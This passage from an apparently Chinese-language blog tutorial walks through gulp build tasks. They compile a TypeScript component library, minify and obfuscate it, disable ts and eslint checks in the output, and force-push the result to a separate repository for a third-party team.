href="https://github.com/stevelacy/gulp-git">gulp-git</a> 来模拟这个操作，我们将这个工作流命名为 <code>pullDev</code>：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">pullDev</span>(<span class="params">cb</span>) &#123;</span><br><span class="line">  git.<span class="title function_">pull</span>(<span class="string">&#x27;origin&#x27;</span>, <span class="string">&#x27;dev&#x27;</span>, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title function_">cb</span>();</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是由于 <code>components</code> 这个库比较特殊，其用到了我们另外的 <code>@types</code> 库（<code>@types</code> 也是一个分库），那么我们要将其 clone 过来，并存放到 <code>@types</code> 目录下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">pullTypes</span>(<span class="params">cb</span>) &#123;</span><br><span class="line">  git.<span class="title function_">clone</span>(<span class="string">&#x27;git@123.59.xx.xxx:fe/common_types.git&#x27;</span>, &#123; <span class="attr">args</span>: <span class="string">&#x27;@types&#x27;</span> &#125;, <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title function_">cb</span>();</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-2-加密代码"><a href="#3-2-加密代码" class="headerlink" title="3.2 加密代码"></a>3.2 加密代码</h2><p>接下来就是核心部分，我们要对当前的源码进行一系列操作，对其加密。</p><p>首先我们的模块采用了 ts 去编写，那么就要将 ts 转为 <code>.js</code> 文件与 <code>.d.ts</code> 文件，这一步可以用 <a href="https://www.npmjs.com/package/gulp-typescript">gulp-typescript</a>，这是一个可以利用 gulp 来构建 typescript 文件的工具，类似于原有的 <code>tsc</code> 指令，但是比 tsc 指令更易懂，也更适合在 gulp 中使用，Typescript 官方也对其进行了推荐（<a href="https://www.tslang.cn/docs/handbook/gulp.html">官方文档</a>）</p><p>我们先声明一下 ts 的编译配置（由于使用 gulp-typescript 可以直接设置编译配置，不需要额外创建一个 tsconfig.json）:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> tsProject = ts.<span class="title function_">createProject</span>(&#123;</span><br><span class="line">  <span class="attr">noImplicitAny</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">target</span>: <span class="string">&#x27;es6&#x27;</span>,</span><br><span class="line">  <span class="attr">jsx</span>: <span class="string">&#x27;react&#x27;</span>,</span><br><span class="line">  <span class="attr">declaration</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">moduleResolution</span>: <span class="string">&#x27;node&#x27;</span>,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>有了配置后，我们就创建一个 transTsx 的工作流，用来转换 ts 文件，同时在转换完成后顺便使用 <code>gulp-minify</code> 来对代码进行压缩和混淆：</p><blockquote><p>PS: gulp-minify 是可以对代码进行混淆的。不知道什么原因，如果同时使用 <code>gulp-minify</code> 压缩代码并使用 <code>gulp-uglify</code> 混淆代码，代码在其他项目的引用中会报错，无法正常使用。</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 声明一些必须忽略的文件</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">MUST_IGNORE_FILES</span> = [</span><br><span class="line">  <span class="string">&#x27;!./node_modules/**&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;!./dist/**&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;!./.git/**&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;!./.idea/**&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;!./gulpfile.js&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;!./package.json&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;!./yarn.lock&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;!./CHANGELOG.md&#x27;</span>,</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">transTsx</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="comment">// 添加 ts-ignore 强行阻止编译校验</span></span><br><span class="line">  <span class="comment">// 生成 js 文件和 d.ts 文件</span></span><br><span class="line">  <span class="keyword">const</span> tsResult = gulp.<span class="title function_">src</span>([<span class="string">&#x27;./**/*.tsx&#x27;</span>, <span class="string">&#x27;./**/*.ts&#x27;</span>, ...<span class="variable constant_">MUST_IGNORE_FILES</span>] <span class="comment">/** 编译所有的 tsx、ts 文件，但要滤掉 MUST_IGNORE_FILES 不编译的 */</span>).<span class="title function_">pipe</span>(<span class="title function_">tsProject</span>())</span><br><span class="line">  <span class="comment">// 对编译好的 js 文件进行压缩混淆处理，并且输出到 dist 目录中，对 dts 文件则直接输出到 dist 目录中</span></span><br><span class="line">  <span class="comment">// (注：这里的 minify 与 dts 的输出并无前后依赖关系，为了加速编译，可以使用 merge 语法并行执行 gulp 编译)</span></span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">merge</span>([</span><br><span class="line">    tsResult.<span class="property">js</span></span><br><span class="line">      .<span class="title function_">pipe</span>(</span><br><span class="line">        <span class="title function_">minify</span>(&#123;</span><br><span class="line">          <span class="attr">ext</span>: &#123;</span><br><span class="line">            <span class="attr">src</span>: <span class="string">&#x27;.js&#x27;</span>,</span><br><span class="line">            <span class="attr">min</span>: <span class="string">&#x27;.js&#x27;</span>,</span><br><span class="line">          &#125;,</span><br><span class="line">          <span class="attr">noSource</span>: <span class="literal">true</span>,</span><br><span class="line">        &#125;),</span><br><span class="line">      ).<span class="title function_">pipe</span>(gulp.<span class="title function_">dest</span>(<span class="string">&#x27;dist&#x27;</span>)),</span><br><span class="line">    tsResult.<span class="property">dts</span>.<span class="title function_">pipe</span>(gulp.<span class="title function_">dest</span>(<span class="string">&#x27;dist&#x27;</span>)),</span><br><span class="line">  ]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>很遗憾，如果这样编译是会报错的，因为 typescript 的编译是非常严格的，如果我们的代码不够规范，typescript 的默认编译模式下铁定会报错，但是小型团队人员水平参差不齐，没办法严格约束规范，并且这些错误并不会对代码的逻辑造成什么影响，编译也不会出什么问题，因此我们可以手动禁用 ts 的代码检查。</p><p>我们知道，在 ts 文件的代码前加上 <code>// @ts-nocheck</code> 备注就可以绕过 ts 的代码检查，那我们如果手动一个个文件去添加那就太麻烦了，好在 gulp 提供了获取文件句柄的方法，这里我们可以在 gulp 中使用 <a href="https://www.npmjs.com/package/through2">through2</a> 来轻松获取到 pipe 流中当前处理的文件句柄，并对文件内容进行更改，因此我们只需要改一下代码，在进行 ts 编译前为源码加上注释即可：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">transTsx</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="comment">// 添加 ts-ignore 强行阻止编译校验</span></span><br><span class="line">  <span class="keyword">const</span> tsNoCheck = gulp.<span class="title function_">src</span>([<span class="string">&#x27;./**/*.tsx&#x27;</span>, <span class="string">&#x27;./**/*.ts&#x27;</span>, ...<span class="variable constant_">MUST_IGNORE_FILES</span>]).<span class="title function_">pipe</span>(</span><br><span class="line">    through.<span class="title function_">obj</span>(<span class="keyword">function</span> (<span class="params">file, encode, cb</span>) &#123;</span><br><span class="line">      <span class="keyword">var</span> result = file.<span class="property">contents</span>.<span class="title function_">toString</span>();</span><br><span class="line">      result = <span class="string">&#x27;// @ts-nocheck\n&#x27;</span> + result;</span><br><span class="line">      file.<span class="property">contents</span> = <span class="title class_">Buffer</span>.<span class="title function_">from</span>(result);</span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">push</span>(file);</span><br><span class="line">      <span class="title function_">cb</span>();</span><br><span class="line">    &#125;),</span><br><span class="line">  );</span><br><span class="line">  <span class="comment">// 生成 js 文件和 d.ts 文件</span></span><br><span class="line">  <span class="keyword">var</span> tsResult = tsNoCheck.<span class="title function_">pipe</span>(<span class="title function_">tsProject</span>());</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">merge</span>([</span><br><span class="line">    tsResult.<span class="property">js</span></span><br><span class="line">      .<span class="title function_">pipe</span>(</span><br><span class="line">        <span class="title function_">minify</span>(&#123;</span><br><span class="line">          <span class="attr">ext</span>: &#123;</span><br><span class="line">            <span class="attr">src</span>: <span class="string">&#x27;.js&#x27;</span>,</span><br><span class="line">            <span class="attr">min</span>: <span class="string">&#x27;.js&#x27;</span>,</span><br><span class="line">          &#125;,</span><br><span class="line">          <span class="attr">noSource</span>: <span class="literal">true</span>,</span><br><span class="line">        &#125;),</span><br><span class="line">      ).<span class="title function_">pipe</span>(gulp.<span class="title function_">dest</span>(<span class="string">&#x27;dist&#x27;</span>)),</span><br><span class="line">    tsResult.<span class="property">dts</span>.<span class="title function_">pipe</span>(gulp.<span class="title function_">dest</span>(<span class="string">&#x27;dist&#x27;</span>)),</span><br><span class="line">  ]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这下，代码也成功编译好了，但是还存在一个遗留问题，由于加密的代码是在其他项目中使用的，其他项目使用了 eslint，如果不进行单独的配置，在项目内使用我们的加密代码时必定会经过 eslint 的检查，为了避免 eslint 的检查，跟避免 ts 检查一样，我们将编译好的 js 代码同样通过 through2 来为代码添加一行 <code>/* eslint-disable */</code> 来禁用 eslint 检查，最终 transTsx 流程的代码为：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">transTsx</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="comment">// 添加 ts-ignore 强行阻止编译校验</span></span><br><span class="line">  <span class="keyword">const</span> tsNoCheck = gulp.<span class="title function_">src</span>([<span class="string">&#x27;./**/*.tsx&#x27;</span>, <span class="string">&#x27;./**/*.ts&#x27;</span>, ...<span class="variable constant_">MUST_IGNORE_FILES</span>]).<span class="title function_">pipe</span>(</span><br><span class="line">    through.<span class="title function_">obj</span>(<span class="keyword">function</span> (<span class="params">file, encode, cb</span>) &#123;</span><br><span class="line">      <span class="keyword">var</span> result = file.<span class="property">contents</span>.<span class="title function_">toString</span>();</span><br><span class="line">      result = <span class="string">&#x27;// @ts-nocheck\n&#x27;</span> + result;</span><br><span class="line">      file.<span class="property">contents</span> = <span class="title class_">Buffer</span>.<span class="title function_">from</span>(result);</span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">push</span>(file);</span><br><span class="line">      <span class="title function_">cb</span>();</span><br><span class="line">    &#125;),</span><br><span class="line">  );</span><br><span class="line">  <span class="comment">// 生成 js 文件和 d.ts 文件</span></span><br><span class="line">  <span class="keyword">var</span> tsResult = tsNoCheck.<span class="title function_">pipe</span>(<span class="title function_">tsProject</span>());</span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">merge</span>([</span><br><span class="line">    tsResult.<span class="property">js</span></span><br><span class="line">      .<span class="title function_">pipe</span>(</span><br><span class="line">        <span class="title function_">minify</span>(&#123;</span><br><span class="line">          <span class="attr">ext</span>: &#123;</span><br><span class="line">            <span class="attr">src</span>: <span class="string">&#x27;.js&#x27;</span>,</span><br><span class="line">            <span class="attr">min</span>: <span class="string">&#x27;.js&#x27;</span>,</span><br><span class="line">          &#125;,</span><br><span class="line">          <span class="attr">noSource</span>: <span class="literal">true</span>,</span><br><span class="line">        &#125;),</span><br><span class="line">      )</span><br><span class="line">      .<span class="title function_">pipe</span>(</span><br><span class="line">        <span class="comment">// 编译混淆后的 js 文件禁用 eslint 检查</span></span><br><span class="line">        through.<span class="title function_">obj</span>(<span class="keyword">function</span> (<span class="params">file, encode, cb</span>) &#123;</span><br><span class="line">          <span class="keyword">var</span> result = file.<span class="property">contents</span>.<span class="title function_">toString</span>();</span><br><span class="line">          result = <span class="string">&#x27;/* eslint-disable */&#x27;</span> + result;</span><br><span class="line">          file.<span class="property">contents</span> = <span class="title class_">Buffer</span>.<span class="title function_">from</span>(result);</span><br><span class="line">          <span class="variable language_">this</span>.<span class="title function_">push</span>(file);</span><br><span class="line">          <span class="title function_">cb</span>();</span><br><span class="line">        &#125;),</span><br><span class="line">      )</span><br><span class="line">      .<span class="title function_">pipe</span>(gulp.<span class="title function_">dest</span>(<span class="string">&#x27;dist&#x27;</span>)),</span><br><span class="line">    tsResult.<span class="property">dts</span>.<span class="title function_">pipe</span>(gulp.<span class="title function_">dest</span>(<span class="string">&#x27;dist&#x27;</span>)),</span><br><span class="line">  ]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-3-处理后事"><a href="#3-3-处理后事" class="headerlink" title="3.3 处理后事"></a>3.3 处理后事</h2><p>ts 的代码已经处理完了，但有时候子库里还有写其他的文件，如 <code>json</code>，这些静态文件是不需要处理的，只要将其复制一份到 dist 中就可以了：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">moveOtherFile</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> gulp</span><br><span class="line">    .<span class="title function_">src</span>([<span class="string">&#x27;./**/*.*&#x27;</span>, <span class="string">&#x27;!./**/*.tsx&#x27;</span>, <span class="string">&#x27;!./**/*.ts&#x27;</span>, <span class="string">&#x27;!./@types/**&#x27;</span>, ...<span class="variable constant_">MUST_IGNORE_FILES</span>], &#123;</span><br><span class="line">      <span class="attr">nodir</span>: <span class="literal">true</span>,</span><br><span class="line">    &#125;)</span><br><span class="line">    .<span class="title function_">pipe</span>(gulp.<span class="title function_">dest</span>(<span class="string">&#x27;dist&#x27;</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后可以写一个 cleanTypes 方法，来移除我们最开始 clone 的 <code>@types</code> 文件依赖：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">cleanTypes</span>(<span class="params">cb</span>) &#123;</span><br><span class="line">  gulp.<span class="title function_">src</span>(<span class="string">&#x27;@types&#x27;</span>, &#123; <span class="attr">allowEmpty</span>: <span class="literal">true</span> &#125;).<span class="title function_">pipe</span>(<span class="title function_">clean</span>());</span><br><span class="line">  <span class="title function_">cb</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-4-同步加密代码到加密子库"><a href="#3-4-同步加密代码到加密子库" class="headerlink" title="3.4 同步加密代码到加密子库"></a>3.4 同步加密代码到加密子库</h2><p>我们已经完成了 <code>components</code> 代码库 encrypt 分支的基础构建，那我们想在编译完成后，将加密过的代码部署到 <code>components_encrypt</code> 库中，然后再把 <code>components_encrypt</code> 交给第三方团队，那么如何保持 <code>components</code> 与 <code>components_encrypt</code> 两个库代码的代码同步呢？这无非就还是一系列的 git 操作，我们可以使用 ci 来自动化部署，但是 ci 的脚本比 gulp 脚本可要难写多了，因此我们这一步也可以用 gulp 来实现，ci 只需要负责运行我们的 gulp 脚本就可以了（有点套娃的意思）。</p><p>这里整理一下我的 git 操作思路：</p><ol><li>构建完成后 cd 到 dist 目录</li><li>执行 git init，在 dist 目录初始化 git</li><li>为当前目录添加 git 源（components_encrypt 代码库的源）</li><li>切到需要 push 代码的分支</li><li>使用 <code>-f</code> 强行将当前更改保存到暂存区</li><li>填写 commit 信息</li><li>使用 <code>-f</code> 强行将代码推到远程分支</li></ol><p>使用 gulp 还原上述的操作，如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="variable constant_">ENCRYPT_REPOSITORY_URL</span> = <span class="string">&#x27;git@123.59.xx.xxx:fe/components_encrypt.git&#x27;</span>; <span class="comment">// 目标更新仓库</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">ENCRYPT_REPOSITORY_BATCH</span> = <span class="string">&#x27;dev&#x27;</span>; <span class="comment">// 目标更新仓库的分支名（注：该分支不能在 GitLab 中设置为 protected 状态）</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// (2)</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">initEncryptRepository</span>(<span class="params">cb</span>) &#123;</span><br><span class="line">  git.<span class="title function_">init</span>(&#123; <span class="attr">cwd</span>: <span class="string">&#x27;./dist&#x27;</span> &#125;, <span class="keyword">function</span> (<span class="params">err</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) <span class="keyword">throw</span> err;</span><br><span class="line">    <span class="title function_">cb</span>();</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// (3)</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">addOriginEncryptRepositoryUrl</span>(<span class="params">cb</span>) &#123;</span><br><span class="line">  git.<span class="title function_">addRemote</span>(<span class="string">&#x27;origin&#x27;</span>, <span class="variable constant_">ENCRYPT_REPOSITORY_URL</span>, &#123; <span class="attr">cwd</span>: <span class="string">&#x27;./dist&#x27;</span> &#125;, <span class="keyword">function</span> (<span class="params">err</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) <span class="keyword">throw</span> err;</span><br><span class="line">    <span class="title function_">cb</span>();</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// (4)</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">checkoutEncryptRepositoryDevBatch</span>(<span class="params">cb</span>) &#123;</span><br><span class="line">  git.<span class="title function_">checkout</span>(<span class="variable constant_">ENCRYPT_REPOSITORY_BATCH</span>, &#123; <span class="attr">args</span>: <span class="string">&#x27;-b&#x27;</span>, <span class="attr">cwd</span>: <span class="string">&#x27;./dist&#x27;</span> &#125;, <span class="keyword">function</span> (<span class="params">err</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) <span class="keyword">throw</span> err;</span><br><span class="line">    <span class="title function_">cb</span>();</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// (5)</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">addEncryptRepositoryChanges</span>(<span class="params">cb</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> gulp.<span class="title function_">src</span>(<span class="string">&#x27;./dist/*&#x27;</span>).<span class="title function_">pipe</span>(</span><br><span class="line">    git.<span class="title function_">add</span>(&#123; <span class="attr">args</span>: <span class="string">&#x27;-f&#x27;</span>, <span class="attr">cwd</span>: <span class="string">&#x27;./dist&#x27;</span> &#125;, <span class="keyword">function</span> (<span class="params">err</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (err) <span class="keyword">throw</span> err;</span><br><span class="line">    &#125;),</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// (6)</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">commitEncryptRepositoryChanges</span>(<span class="params">cb</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> gulp.<span class="title function_">src</span>(<span class="string">&#x27;./dist/*&#x27;</span>).<span class="title function_">pipe</span>(</span><br><span class="line">    git.<span class="title function_">commit</span>(<span class="string">&#x27;ci: update source&#x27;</span>, &#123; <span class="attr">cwd</span>: <span class="string">&#x27;./dist&#x27;</span> &#125;, <span class="keyword">function</span> (<span class="params">err</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (err) <span class="keyword">throw</span> err;</span><br><span class="line">    &#125;),</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// (7)</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">pushEncryptRepositoryChanges</span>(<span class="params">cb</span>) &#123;</span><br><span class="line">  git.<span class="title function_">push</span>(<span class="string">&#x27;origin&#x27;</span>, <span class="variable constant_">ENCRYPT_REPOSITORY_BATCH</span>, &#123; <span class="attr">args</span>: <span class="string">&#x27;-u -f&#x27;</span>, <span class="attr">cwd</span>: <span class="string">&#x27;./dist&#x27;</span> &#125;, <span class="keyword">function</span> (<span class="params">err</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (err) &#123;</span><br><span class="line">      <span class="keyword">if</span> (err) <span class="keyword">throw</span> err;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="title function_">cb</span>();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 聚合任务</span></span><br><span class="line">gulp.<span class="title function_">task</span>(</span><br><span class="line">  <span class="string">&#x27;publish&#x27;</span>,</span><br><span class="line">  gulp.<span class="title function_">series</span>(</span><br><span class="line">    initEncryptRepository,</span><br><span class="line">    addOriginEncryptRepositoryUrl,</span><br><span class="line">    checkoutEncryptRepositoryDevBatch,</span><br><span class="line">    addEncryptRepositoryChanges,</span><br><span class="line">    commitEncryptRepositoryChanges,</span><br><span class="line">    pushEncryptRepositoryChanges,</span><br><span class="line">  ),</span><br><span class="line">);</span><br></pre></td></tr></table></figure><h1 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> gulp = <span class="built_in">require</span>(<span class="string">&#x27;gulp&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> through = <span class="built_in">require</span>(<span class="string">&#x27;through2&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> merge = <span class="built_in">require</span>(<span class="string">&#x27;merge2&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> ts = <span class="built_in">require</span>(<span class="string">&#x27;gulp-typescript&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> minify = <span class="built_in">require</span>(<span class="string">&#x27;gulp-minify&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> 